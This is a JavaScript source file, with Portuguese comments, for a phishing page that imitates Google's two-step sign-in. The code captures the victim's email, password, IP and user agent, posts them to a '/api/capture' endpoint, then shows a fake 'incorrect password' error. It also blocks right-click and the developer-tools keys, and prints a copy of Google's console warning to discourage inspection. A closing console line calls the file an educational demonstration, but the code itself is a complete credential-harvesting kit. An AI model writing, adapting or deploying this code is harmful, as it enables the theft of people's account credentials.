// Elementos DOM
const emailStep = document.getElementById('email-step');
const passwordStep = document.getElementById('password-step');
const emailForm = document.getElementById('email-form');
const passwordForm = document.getElementById('password-form');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const userNameElement = document.getElementById('user-name');
const userEmailElement = document.getElementById('user-email');
const showPasswordCheckbox = document.getElementById('show-pass');

// Dados capturados
let capturedData = {
    email: '',
    password: '',
    timestamp: '',
    userAgent: navigator.userAgent,
    ip: ''
};

// Função para obter IP do usuário
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.log('Erro ao obter IP:', error);
        return 'Não disponível';
    }
}

// Função para extrair nome do email
function extractNameFromEmail(email) {
    const localPart = email.split('@')[0];
    const name = localPart.replace(/[._]/g, ' ');
    return name.split(' ')
        .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
        .join(' ');
}

// Função para mostrar/ocultar senha
showPasswordCheckbox.addEventListener('change', function() {
    passwordInput.type = this.checked ? 'text' : 'password';
});

// Manipulador do formulário de email
emailForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = emailInput.value.trim();
    if (!email) return;
    
    // Adicionar estado de loading
    const submitBtn = this.querySelector('.next-btn');
    submitBtn.classList.add('loading');
    submitBtn.disabled = true;
    
    // Simular delay de verificação
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    // Capturar email
    capturedData.email = email;
    capturedData.timestamp = new Date().toISOString();
    capturedData.ip = await getUserIP();
    
    // Atualizar interface para tela de senha
    const userName = extractNameFromEmail(email);
    userNameElement.textContent = userName;
    userEmailElement.textContent = email;
    
    // Transição para tela de senha
    emailStep.classList.remove('active');
    passwordStep.classList.add('active');
    
    // Focar no campo de senha
    setTimeout(() => {
        passwordInput.focus();
    }, 300);
});

// Manipulador do formulário de senha
passwordForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const password = passwordInput.value.trim();
    if (!password) return;
    
    // Adicionar estado de loading
    const submitBtn = this.querySelector('.next-btn');
    submitBtn.classList.add('loading');
    submitBtn.disabled = true;
    
    // Capturar senha
    capturedData.password = password;
    
    // Simular delay de autenticação
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Enviar dados capturados
    await sendCapturedData();
    
    // Redirecionar para página real do Google (opcional)
    // window.location.href = 'https://accounts.google.com/signin';
    
    // Ou mostrar mensagem de erro falsa
    showFakeError();
});

// Função para enviar dados capturados por email
async function sendCapturedData() {
    try {
        const response = await fetch('/api/capture', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(capturedData)
        });
        
        if (response.ok) {
            console.log('Dados enviados com sucesso');
        } else {
            console.error('Erro ao enviar dados');
        }
    } catch (error) {
        console.error('Erro na requisição:', error);
    }
}

// Função para mostrar erro falso
function showFakeError() {
    // Remover loading
    const submitBtn = passwordForm.querySelector('.next-btn');
    submitBtn.classList.remove('loading');
    submitBtn.disabled = false;
    
    // Adicionar classe de erro no campo de senha
    passwordInput.classList.add('error');
    
    // Criar mensagem de erro
    let errorMsg = document.querySelector('.error-message');
    if (!errorMsg) {
        errorMsg = document.createElement('div');
        errorMsg.className = 'error-message';
        passwordInput.parentNode.appendChild(errorMsg);
    }
    
    errorMsg.textContent = 'Senha incorreta. Tente novamente ou clique em "Esqueceu a senha?" para redefini-la.';
    
    // Limpar campo de senha e atualizar label
    passwordInput.value = '';
    passwordInput.parentNode.classList.remove('filled');
    passwordInput.focus();
    
    // Remover erro após 5 segundos
    setTimeout(() => {
        passwordInput.classList.remove('error');
        if (errorMsg) {
            errorMsg.remove();
        }
    }, 5000);
}

// Função para detectar tentativas de inspeção
function detectDevTools() {
    let devtools = {
        open: false,
        orientation: null
    };
    
    const threshold = 160;
    
    setInterval(() => {
        if (window.outerHeight - window.innerHeight > threshold || 
            window.outerWidth - window.innerWidth > threshold) {
            if (!devtools.open) {
                devtools.open = true;
                console.clear();
                console.log('%cPARAR!', 'color: red; font-size: 50px; font-weight: bold;');
                console.log('%cEste é um recurso do navegador destinado a desenvolvedores. Se alguém disse para você copiar e colar algo aqui para ativar um recurso do Google ou "hackear" a conta de alguém, trata-se de um golpe e essa pessoa terá acesso à sua conta do Google.', 'color: red; font-size: 16px;');
            }
        } else {
            devtools.open = false;
        }
    }, 500);
}

// Inicializar detecção de ferramentas de desenvolvedor
detectDevTools();

// Prevenir clique direito e teclas de desenvolvedor
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});

document.addEventListener('keydown', function(e) {
    // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
    if (e.keyCode === 123 || 
        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
        (e.ctrlKey && e.keyCode === 85)) {
        e.preventDefault();
        return false;
    }
});

// Função para gerenciar labels flutuantes
function setupFloatingLabels() {
    const inputs = document.querySelectorAll('input[type="email"], input[type="password"]');
    
    inputs.forEach(input => {
        const inputGroup = input.parentNode;
        
        // Verificar se já tem conteúdo ao carregar
        if (input.value.trim() !== '') {
            inputGroup.classList.add('filled');
        }
        
        input.addEventListener('focus', function() {
            inputGroup.classList.add('focused');
        });
        
        input.addEventListener('blur', function() {
            inputGroup.classList.remove('focused');
            if (this.value.trim() !== '') {
                inputGroup.classList.add('filled');
            } else {
                inputGroup.classList.remove('filled');
            }
        });
        
        input.addEventListener('input', function() {
            if (this.value.trim() !== '') {
                inputGroup.classList.add('filled');
            } else {
                inputGroup.classList.remove('filled');
            }
        });
    });
}

// Inicializar labels flutuantes quando a página carregar
document.addEventListener('DOMContentLoaded', setupFloatingLabels);

// Log para fins educacionais
console.log('🔒 Esta é uma demonstração educacional de phishing');
console.log('📚 Dados capturados:', capturedData);
